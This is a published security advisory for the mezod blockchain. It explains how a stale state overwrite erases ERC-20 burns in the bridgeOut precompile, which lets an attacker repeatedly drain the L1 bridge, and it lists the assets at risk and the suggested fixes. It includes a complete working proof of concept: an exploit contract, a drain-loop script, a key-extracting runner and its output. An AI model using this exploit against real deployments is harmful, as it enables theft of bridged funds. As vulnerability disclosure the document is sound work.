# [H] Mezo: ERC-20 bridgeOut burn can be erased by a stale StateDB overwrite leading to full L1 bridge drain

## Summary
Severity: High
Advisory: GHSA-6447-269v-g68m
CWE: CWE-662
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-6447-269v-g68m
Type: github-advisory

## Affected
- Go: `github.com/mezo-org/mezod` — affected >=0 <8.0.0

## Details
**Note: the fixed version of the validator client has been deployed for some time.**

### Impact

Potential full drain of L1 bridge without changing bridged balance on Mezo.

## Brief/Intro

A malicious user can steal all ERC-20 tokens locked in the L1 bridge by repeatedly calling the `bridgeOut` precompile from a crafted contract. The precompile's ERC-20 burn executes in an **inner StateDB** that commits to a cache context, but the **outer StateDB** still holds stale pre-burn storage slots in its `dirtyStorage`. When the outer transaction commits, it overwrites the inner burn with stale values -- **restoring the attacker's balance and allowance** while the `AssetsUnlocked` event has already been persisted to the bridge store. The Ethereum sidecar observes this event and attests the unlock on L1, releasing real tokens to the attacker. The attacker keeps their Mezo balance intact and can repeat the drain every block.

## Vulnerability Details

Mezo's EVM uses a dual-context state architecture for precompile calls. When a precompile is invoked, `Contract.Run()` calls `stateDB.CacheContext()` which creates a `cachedCtx` branched from the base `ctx`. Cosmos-side state changes (like ERC-20 burns) happen on `cachedCtx`, while standard EVM storage operations (SLOAD/SSTORE) operate on the outer StateDB's `dirtyStorage` backed by `baseCtx`.

The `bridgeOut` precompile handles two token types with fundamentally different mechanisms:

- **BTC (`burnBitcoin`)**: Burns via `x/bank` (Cosmos native), then explicitly records a `journal.SubBalance` entry. `syncJournalEntries()` propagates this to the outer StateDB, keeping both contexts in sync.
- **ERC-20 (`burnERC20`)**: Burns via `ExecuteContractCall`, which creates an **entirely new inner StateDB** operating on `cachedCtx`. This inner StateDB executes `burnFrom` (decreasing balance, supply, and allowance slots), commits its changes to `cachedCtx`, and is discarded. **No journal entry is created.** The outer StateDB is never informed of these storage changes.

This creates a critical asymmetry. After `burnERC20` returns, the outer StateDB's `dirtyStorage` still contains the **pre-burn allowance** (written by `approve` earlier in the same transaction), and has **never loaded** the balance or supply slots. When the attacker triggers a subsequent `transfer(sink, 1)` in the same transaction, the outer StateDB performs a `GetCommittedState` on the balance slot. This reads from `baseCtx` -- which holds the **stale pre-burn value** because `cachedCtx` changes haven't been flushed to `baseCtx` yet. The stale balance minus 1 is written to `dirtyStorage`.

At end-of-transaction, `StateDB.Commit()` executes in this order:

```go
func (s *StateDB) Commit() error {
    if s.flushCache != nil {
        s.flushCache()    // Step 1: flush cachedCtx → baseCtx (inner burn lands)
    }
    return s.commit(s.ctx) // Step 2: write dirtyStorage → baseCtx (stale values overwrite)
}
```

Step 1 flushes the inner burn into `baseCtx`. Step 2 then iterates every slot in `dirtyStorage` and calls `keeper.SetState` on `baseCtx` -- **unconditionally**, without comparing against current values:

```go
func (s *StateDB) commit(ctx sdk.Context) error {
    for _, addr := range s.journal.sortedDirties() {
        obj := s.stateObjects[addr]
        // ...
        for _, key := range obj.dirtyStorage.SortedKeys() {
            s.keeper.SetState(ctx, obj.Address(), key, obj.dirtyStorage[key].Bytes())
        }
    }
    return nil
}
```

The stale allowance slot in `dirtyStorage` (from the `approve` before `bridgeOut`) overwrites the zeroed-out allowance that the inner burn wrote. The stale balance slot (from the `transfer` after `bridgeOut`) overwrites the zeroed-out balance. **The burn is erased.**

Meanwhile, `SaveAssetsUnlocked` was called on `cachedCtx` during the precompile execution, persisting the `AssetsUnlockedEvent` to the bridge module's KV store. This event is flushed to `baseCtx` at Step 1 and survives Step 2 (different KV store prefix, not touched by `dirtyStorage`). The Ethereum sidecar observes this event and calls `AttestBridgeOut` on the L1 `MezoBridge` contract, releasing real tokens to the attacker's L1 address.

The attack is **repeatable per-block**. Each execution costs only 1 wei (the `transfer` trigger) while draining the full `bridgeOut` amount from L1. There is no supply assertion for ERC-20 tokens (only `abtc` is checked in `verifyBTCSupply`), so no end-of-block invariant catches the mismatch.

## Impact Details
CRITICAL - Using a fixed balance of e.g., 10,000 USDC on mezo an attacker can completly drain the USDC balance on ETH mainnet bridge via repeated exploit transactions on mezo.


The Mezo bridge on L1 (0xF6680EA3b480cA2b72D96ea13cCAF2cFd8e6908c) holds approximatively ~1,753,958.4 USD worth of assets that can be stolen, taking into account offramp limit safeguard. Below are the details of asset that can be drained:

- cbBTC (mcbBTC: 0x6a7CD8E1384d49f502b4A4CE9aC9eb320835c5d7):

limit: 900000000 (9 cbBTC)
decimals: 8
L1 bridge balance: 25.01605546 cbBTC
VALUE AT RISK: (9 cbBTC) 633,190.53 USD

- T (mT: 0xaaC423eDC4E3ee9ef81517e8093d52737165b71F):

limit: 60000000000000000000000000 (60,000,000 T)
decimals: 18
L1 bridge balance: 426,294,138.843419368493748432 T
VALUE AT RISK: (60,000,000 T) 397,537.57 USD AT RISK

- USDC (mUSDC: 0x04671C72Aab5AC02A03c1098314b1BB6B560c197):

limit: 10000000000000 (10,000,000 USDC)
decimals: 6
L1 bridge balance: 508,549.393027 USDC
VALUE AT RISK: 508,549.39 USDC AT RISK

- USDT (mUSDT: 0xeB5a5d39dE4Ea42C2Aa6A57EcA2894376683bB8E):

limit: 10000000000000 (10,000,000 USDT)
decimals: 6
L1 bridge balance: 85,247.963024 USDT
VALUE AT RISK: 85,247.96 USDT

- xSolvBTC (mxSolvBTC: 0xdF708431162Ba247dDaE362D2c919e0fbAfcf9DE)

limit: 90000000000000000000 (90 xSolvBTC)
decimals: 18
L1 bridge balance: 1.103740676354553591 xSolvBTC
VALUE AT RISK: 1.10374068 xSolvBTC (76,765.16 USD)

- SolvBTC (msolvBTC: 0xa10aD2570ea7b93d19fDae6Bd7189fF4929Bc747)

limit 90000000000000000000 (90 solvBTC)
decimals: 18
L1 bridge balance: 0.496396263084933802 SolvBTC
VALUE AT RISK: 0.49639626 solvBTC (34,920.48 USD)

- FunctionBTC (mFBTC: 0x812fcC0Bb8C207Fd8D6165a7a1173037F43B2dB8)

limit: 900000000 (9 FBTC)
decimals: 8
L1 bridge balance: 0.18064148 FBTC
VALUE AT RISK: 0.18064148 FBTC (12,741.73 USD)

- USDe (mUSDe: 0xdf6542260a9F768f07030E4895083F804241F4C4)

limit: 1000000000000000000000000 (1,000,000.00 USDe)
decimals: 18
L1 bridge balance: 4,123.909662607937020208 USDe
VALUE AT RISK: 4,123.20 USDe

- swBTC (mswBTC: 0x29fA8F46CBB9562b87773c8f50a7F9F27178261c)

limit: 900000000 (9 swBTC)
decimals: 8
L1 bridge balance: 0.02709065 swBTC
VALUE AT RISK: 0.02709065 (2,904.74 USD)

- DAI (mDAI: 0x1531b6e3d51BF80f634957dF81A990B92dA4b154)

limit: 1000000000000000000000000 (1,000,000.00 DAI)
decimals: 18
L1 bridge balance: 882.421484670245389691 DAI
VALUE AT RISK: 882.38 DAI

**Total assets currently at risk taking into consideration limits per ERC20 token and available drainable balance on the bridge: 1,753,958.4 USD of assets on L1.**



## References

- `x/evm/statedb/statedb.go:677-684` -- `Commit()` flushes cache context then writes `dirtyStorage`, allowing stale outer slots to overwrite inner burn results. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/evm/statedb/statedb.go#L677-L684
- `x/evm/statedb/statedb.go:655-674` -- `commit()` writes every `dirtyStorage` entry to the KV store unconditionally, without checking if the value has been superseded by the inner context flush. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/evm/statedb/statedb.go#L655-L674
- `x/evm/statedb/state_object.go:236-244` -- `GetCommittedState()` reads from `s.db.ctx` (the base context), returning stale pre-burn values for slots not yet flushed from `cachedCtx`. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/evm/statedb/state_object.go#L236-L244
- `precompile/contract.go:228` -- `CommitCacheContext()` writes draft storage to `cachedCtx` before precompile execution, but does not invalidate the outer StateDB's `dirtyStorage` or `originStorage`. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/precompile/contract.go#L228
- `precompile/contract.go:254-265` -- `syncJournalEntries()` only processes `SubBalance`/`AddBalance` entries, which `burnBitcoin` uses but `burnERC20` does not, creating the BTC/ERC-20 asymmetry. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/precompile/contract.go#L254-L265
- `precompile/assetsbridge/bridge_out.go:141-152` -- `burnERC20()` delegates to `ExecuteContractCall` without creating any journal entry, making the burn invisible to the outer StateDB. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/precompile/assetsbridge/bridge_out.go#L141-L152
- `precompile/assetsbridge/bridge_out.go:221-222` -- `burnBitcoin()` explicitly creates a `journal.SubBalance` entry, the mechanism absent from `burnERC20`. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/precompile/assetsbridge/bridge_out.go#L221-L222
- `x/evm/keeper/call.go:19-62` -- `ExecuteContractCall()` creates a new inner StateDB via `ApplyMessage(ctx, msg, tracer, true)`, where `true` means it commits the inner StateDB on completion. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/evm/keeper/call.go#L19-L62
- `x/evm/keeper/state_transition.go:390` -- `ApplyMessageWithConfig` creates a fresh `statedb.New(ctx, k, txConfig)` using the passed context (`cachedCtx`), isolating the inner state from the outer StateDB. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/evm/keeper/state_transition.go#L390
- `x/bridge/keeper/assets_unlocked.go:104-163` -- `SaveAssetsUnlocked()` persists the unlock event to the bridge KV store on `cachedCtx`, which survives the stale overwrite because it operates on a different store prefix. -> https://github.com/mezo-org/mezod/blob/17af5fdf29a6884d52e5ba6a1ee788c1f6e2a5ab/x/bridge/keeper/assets_unlocked.go#L104-L163

## Fix

The root cause is that the outer StateDB's `dirtyStorage` is allowed to overwrite values that the inner StateDB (via `ExecuteContractCall`) has already committed to `cachedCtx`. Two complementary approaches:

1. **Invalidate stale entries**: After `flushCache()` in `Commit()`, clear any `dirtyStorage` / `originStorage` entries that overlap with slots modified by the inner context. This prevents the blind overwrite in step 2.
2. **Symmetric journal propagation**: Make `burnERC20` create journal entries (like `burnBitcoin` does) so that `syncJournalEntries()` reflects the balance and allowance changes in the outer StateDB. This removes the BTC/ERC-20 asymmetry entirely.


## Proof-of-Concept/Exploit
For a realistic, mainnet-like reproduction we will poc the attack on 4 validator cluster in local network.

Video walkthrough -> https://mega.nz/file/rfYiEDoY#q53XXKdkBe8jIcOueAohbFHt9UkggTgKGIK41iEMSBA

- git clone latest release of `mezod` repo (v7.0.0)
```sh
git clone https://github.com/mezo-org/mezod.git
```
- clean any previous localnet and binary.
```sh
## clean previous localnet (if any)
make localnet-bin-clean
```
- build the binary and initialize the localnet.

```sh
## This creates .localnet/node{0,1,2,3}/ directories with keyring and config.
make localnet-bin-init
```
- Start each validator in separate terminals.

```sh
make localnet-bin-start #then 0
make localnet-bin-start #then 1
make localnet-bin-start #then 2
make localnet-bin-start #then 3
```

- At this point wait atleast 5 blocks while monitoring the logs to see if the localnet is ready.

- install solidity/hardhat deps (if first time):
```sh
cd solidity
npm install
cd ..
```
- In `mezod/solidity/hardhat.config.ts` add the localnet in network code branch:

```ts
// networks: {
localnet: {
      chainId: 31611,
      url: process.env.LOCALNET_RPC_URL || "http://localhost:8545/",
      accounts: parseCommaDelimitedString(process.env.LOCALNET_PRIVATE_KEY as string),
    },
// }
```

- Create the `ExploitContract.sol` file in `solidity/contracts` path, and add the following contract:

```sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAssetsBridge {
    function bridgeOut(
        address token,
        uint256 amount,
        uint8 chain,
        bytes calldata recipient
    ) external returns (bool);
}

/// @title ExploitContract
/// @notice Exploits the dual-context stale-read overwrite in Mezo's EVM.
///         Within a single tx: approve → bridgeOut (inner burn) → transfer
///         (forces stale SLOAD). On commit, outer dirtyStorage overwrites the
///         inner burn, restoring balance and allowance.
contract ExploitContract {
    address private constant BRIDGE =
        0x7B7C000000000000000000000000000000000012;

    address public transferRecipient;

    constructor(address _transferRecipient) {
        transferRecipient = _transferRecipient;
    }

    function exploit(
        address token,
        uint256 amount,
        bytes calldata recipient
    ) external {
        IERC20 t = IERC20(token);

        // Outer stateDB writes allowance slot into dirtyStorage.
        t.approve(BRIDGE, amount);

        // Inner stateDB (via ExecuteContractCall) burns balance, supply,
        // allowance on cachedCtx. Outer stateDB still holds stale allowance
        // in dirtyStorage and has not loaded balance/supply.
        bool ok = IAssetsBridge(BRIDGE).bridgeOut(
            token, amount, 0, recipient
        );
        require(ok, "bridgeOut failed");

        // Forces outer stateDB to SLOAD balance from baseCtx (stale pre-burn
        // value), then SSTORE (staleBalance - 1) into dirtyStorage.
        // At commit, outer's dirtyStorage overwrites inner's burn.
        t.transfer(transferRecipient, 1);
    }
}
```
I've put extensive explanation about the attack contract see comments

- Create the `poc_exploit.ts` file in `solidity/scripts` path and paste the following scipt:

```ts
/**
 * PoC: ERC-20 BridgeOut Stale-Read Overwrite — Repeated Drain
 *
 * Demonstrates that an attacker with only 20,000 USDC can drain
 * 20,000 USDC from L1 five times (100,000 USDC total) because the
 * burn is erased after every exploit transaction.
 *
 * Reproduction (from repo root):
 *   1. make localnet-bin-clean && make localnet-bin-init
 *   2. Start all 4 nodes  (make localnet-bin-start — select 0,1,2,3)
 *   3. cd solidity && npm install   (first time only)
 *   4. bash scripts/run_poc.sh
 */

import { ethers, upgrades } from "hardhat";

const BRIDGE = "0x7B7C000000000000000000000000000000000012";
const BRIDGE_ABI = [
  "function createERC20TokenMapping(address,address) external returns (bool)",
  "function setOutflowLimit(address,uint256) external returns (bool)",
  "function setMinBridgeOutAmount(address,uint256) external returns (bool)",
  "event AssetsUnlocked(uint256 indexed unlockSequenceNumber, bytes indexed recipient, address indexed token, address sender, uint256 amount, uint8 chain)",
];

const ROUNDS  = 5;
const AMT     = 20_000n * 10n ** 6n;        // 20 K USDC per round
const SUPPLY  = 508_549_320_673n;            // production totalSupply (6 decimals)
const OUTFLOW = 10_000_000_000_000n;         // production outflow limit
const MIN_OUT = 20_000_000n;                 // production min bridgeOut (20 USDC)

function fmt(v: bigint): string {
  return (Number(v) / 1e6).toLocaleString("en-US", { minimumFractionDigits: 2 });
}

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  // 1. deploy mUSDC (+ real production values)
  console.log("\n[1] Deploying mUSDC (production proxy) ...");
  const mUSDC = await upgrades.deployProxy(
    await ethers.getContractFactory("mUSDC", deployer),
    ["Mezo USD Coin", "mUSDC", 6, deployer.address],
    { kind: "transparent", initialOwner: deployer.address, redeployImplementation: "always" },
  );
  await mUSDC.waitForDeployment();
  await (await mUSDC.initializeV2()).wait();
  const token = await mUSDC.getAddress();
  console.log("    token :", token);

  // 2. node0 (only admin) register the mUSDC token with bridge
  console.log("\n[2] Registering token with AssetsBridge precompile ...");
  const SRC = ethers.getAddress(
    "0x" + ethers.keccak256(ethers.toUtf8Bytes("poc-usdc:" + token)).slice(-40),
  );
  const bridge = new ethers.Contract(BRIDGE, BRIDGE_ABI, deployer);
  await (await bridge.createERC20TokenMapping(SRC, token)).wait();
  await (await bridge.setOutflowLimit(token, OUTFLOW)).wait();
  await (await bridge.setMinBridgeOutAmount(token, MIN_OUT)).wait();
  console.log("    done");

  // 3. mint supply & fund attacker with exactly 20,000 USDC
  console.log("\n[3] Minting supply & funding attacker ...");
  await (await mUSDC.mint(deployer.address, SUPPLY)).wait();
  await (await mUSDC.transfer(attacker.address, AMT)).wait();
  console.log("    total supply :", fmt(await mUSDC.totalSupply()), "USDC");
  console.log("    attacker got :", fmt(AMT), "USDC");

  // 4. deploy exploit contract & send the 20,000 USDC into it
  console.log("\n[4] Deploying ExploitContract ...");
  const exploit = await (
    await ethers.getContractFactory("ExploitContract", attacker)
  ).deploy(attacker.address);
  await exploit.waitForDeployment();
  const exploitAddr = await exploit.getAddress();
  await (await mUSDC.connect(attacker).transfer(exploitAddr, AMT)).wait();
  console.log("    contract :", exploitAddr);
  console.log("    funded   :", fmt(await mUSDC.balanceOf(exploitAddr)), "USDC");

  // 5. exploit loop — drain 20,000 USDC × 5 from L1 with only 20,000 USDC (could be less needed with same result but slower)
  const iface = new ethers.Interface(BRIDGE_ABI);
  let totalDrained = 0n;

  console.log("\n══════════════════════════════════════════════════════");
  console.log("  Starting exploit: 20,000 USDC → drain 5 × 20,000 USDC from L1");
  console.log("══════════════════════════════════════════════════════");

  for (let i = 1; i <= ROUNDS; i++) {
    const bal = await mUSDC.balanceOf(exploitAddr);

    const tx = await exploit.connect(attacker).exploit(
      token, bal, "0x" + "aa".repeat(20), { gasLimit: 5_000_000 },
    );
    const rc = await tx.wait();

    let l1Amount = 0n;
    for (const log of rc!.logs) {
      try {
        const p = iface.parseLog({ topics: log.topics as string[], data: log.data });
        if (p?.name === "AssetsUnlocked") l1Amount = p.args.amount;
      } catch {}
    }
    // crucial check to ensure the attack is successful
    if (l1Amount === 0n) throw new Error(`Round ${i}: AssetsUnlocked event not found`);
    totalDrained += l1Amount;

    const balAfter = await mUSDC.balanceOf(exploitAddr);

    // BALANCE AFTER SHOULD HAVE BEEN 0
    console.log(
      `\n  Round ${i}/${ROUNDS}` +
      `  |  bridged: ${fmt(l1Amount)} USDC` +
      `  |  balance after: ${fmt(balAfter)} USDC (raw: ${balAfter})` +
      `  |  total drained: ${fmt(totalDrained)} USDC`,
    );
  }

  // 6. final state
  const finalBal   = await mUSDC.balanceOf(exploitAddr);
  const finalSup   = await mUSDC.totalSupply();

  console.log("\n── FINAL STATE ────────────────────────────────────");
  console.log("  balance remaining :", fmt(finalBal), "USDC");
  console.log("  totalSupply       :", fmt(finalSup), "USDC");

  console.log("\n── Result of the exploit ────────────────────────────────────────");
  console.log("  Started with      :", fmt(AMT), "USDC");
  console.log("  Drained from L1   :", fmt(totalDrained), `USDC (${ROUNDS} rounds)`);
  console.log("  Still holds       :", fmt(finalBal), "USDC");
  if (totalDrained > AMT) {
    console.log(`\n  Exploit successful`);
    console.log(` initially attacker had ${fmt(AMT)} USDC, extracted ${fmt(totalDrained)} USDC from L1`);
  } else {
    console.log("\n  Not triggered");
  }
}

main().then(() => process.exit(0)).catch((e) => { console.error(e); process.exit(1); });

```
- And create the `run_poc.sh` file in `solidity/scripts` path and paste the followin script:

```sh
#!/usr/bin/env bash
# PoC runner — extracts localnet keys and runs the exploit.
#
# Usage (from repo root):
#   make localnet-bin-clean && make localnet-bin-init
#   # start all 4 nodes in separate terminals (make localnet-bin-start)
#   cd solidity && npm install        # first time only
#   bash scripts/run_poc.sh

set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
SOL="$ROOT/solidity"
MEZOD="$ROOT/build/mezod"

die() { echo "ERROR: $1" >&2; exit 1; }

[[ -x "$MEZOD" ]]                       || die "mezod not found — run 'make build'"
[[ -d "$ROOT/.localnet/node0/mezod" ]]   || die "localnet not initialised — run 'make localnet-bin-init'"

# wait for RPC
echo "[*] Waiting for JSON-RPC ..."
for i in $(seq 1 10); do
  curl -sf http://localhost:8545/ -X POST -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
    >/dev/null 2>&1 && break
  [[ $i -eq 10 ]] && die "JSON-RPC unreachable — start the 4 nodes first"
  sleep 1
done

# extract keys (stderr suppressed — only the hex key comes on stdout)
key0=$(echo y | "$MEZOD" keys export node0 --unsafe --unarmored-hex \
  --home "$ROOT/.localnet/node0/mezod" --keyring-backend test 2>/dev/null \
  | grep -oE '[0-9a-f]{64}' | head -1)
key1=$(echo y | "$MEZOD" keys export node1 --unsafe --unarmored-hex \
  --home "$ROOT/.localnet/node1/mezod" --keyring-backend test 2>/dev/null \
  | grep -oE '[0-9a-f]{64}' | head -1)

[[ -n "$key0" && -n "$key1" ]] || die "could not extract private keys"

cat > "$SOL/.env" <<EOF
LOCALNET_RPC_URL=http://localhost:8545/
LOCALNET_PRIVATE_KEY=${key0},${key1}
EOF

rm -f "$SOL/.openzeppelin/unknown-31611.json"

echo "[*] Keys extracted, .env written, running exploit ..."
echo ""
cd "$SOL"
npx hardhat run scripts/poc_exploit.ts --network localnet

```
- Finally run the `run_poc.sh` script, which intiate the whole attack operation automatically.
```sh
bash solidity/scripts/run_poc.sh
```

**Output:**

```sh
bash solidity/scripts/run_poc.sh

[*] Waiting for JSON-RPC ...
[*] Keys extracted, .env written, running exploit ...

Compiled 45 Solidity files successfully (evm target: london).

[1] Deploying mUSDC (production proxy) ...
    token : 0x50BA893843a85A538565ad268a52a39e4eADF9dA

[2] Registering token with AssetsBridge precompile ...
    done

[3] Minting supply & funding attacker ...
    total supply : 508,549.321 USDC
    attacker got : 20,000.00 USDC

[4] Deploying ExploitContract ...
    contract : 0x021908feD9e2573a24A41c3770f121EF1dFa0F85
    funded   : 20,000.00 USDC

══════════════════════════════════════════════════════
  Starting exploit: 20,000 USDC → drain 5 × 20,000 USDC from L1
══════════════════════════════════════════════════════
 
  Round 1/5  |  bridged: 20,000.00 USDC  |  balance after: 20,000.00 USDC (raw: 19999999999)  |  total drained: 20,000.00 USDC

  Round 2/5  |  bridged: 20,000.00 USDC  |  balance after: 20,000.00 USDC (raw: 19999999998)  |  total drained: 40,000.00 USDC

  Round 3/5  |  bridged: 20,000.00 USDC  |  balance after: 20,000.00 USDC (raw: 19999999997)  |  total drained: 60,000.00 USDC

  Round 4/5  |  bridged: 20,000.00 USDC  |  balance after: 20,000.00 USDC (raw: 19999999996)  |  total drained: 80,000.00 USDC

  Round 5/5  |  bridged: 20,000.00 USDC  |  balance after: 20,000.00 USDC (raw: 19999999995)  |  total drained: 100,000.00 USDC

── FINAL STATE ────────────────────────────────────
  balance remaining : 20,000.00 USDC
  totalSupply       : 408,549.321 USDC

── Result of the exploit ────────────────────────────────────────
  Started with      : 20,000.00 USDC
  Drained from L1   : 100,000.00 USDC (5 rounds)
  Still holds       : 20,000.00 USDC

  Exploit successful
 initially attacker had 20,000.00 USDC, extracted 100,000.00 USDC from L1
```
The `run_poc.sh` script handles everything automatically:

1. Waits for the JSON-RPC endpoint (localhost:8545) to be reachable
2. Extracts private keys for node0 (deployer/admin) and node1 (attacker) from the localnet keyring
3. Writes them to solidity/.env
4. Runs poc_exploit.ts via Hardhat against the localnet network

**What the script does:**

- deployer (node0) deploys the production mUSDC proxy contract, registers it with the AssetsBridge precompile using real production parameters, mints supply, and sends 20,000 USDC to the attacker
- attacker (node1) deploys ExploitContract and funds it with 20,000 USDC
- The exploit runs 5 rounds -- each round calls exploit() which atomically does approve → bridgeOut → transfer(1 wei) in a single transaction
- After each round, the script verifies the AssetsUnlocked event was emitted and logs the balance

**this issue is valid and currently exploitable leading to draining the ERC20 assets from the L1 bridge balance at no actual cost.**

## References
- https://github.com/mezo-org/mezod/security/advisories/GHSA-6447-269v-g68m
- https://github.com/mezo-org/mezod
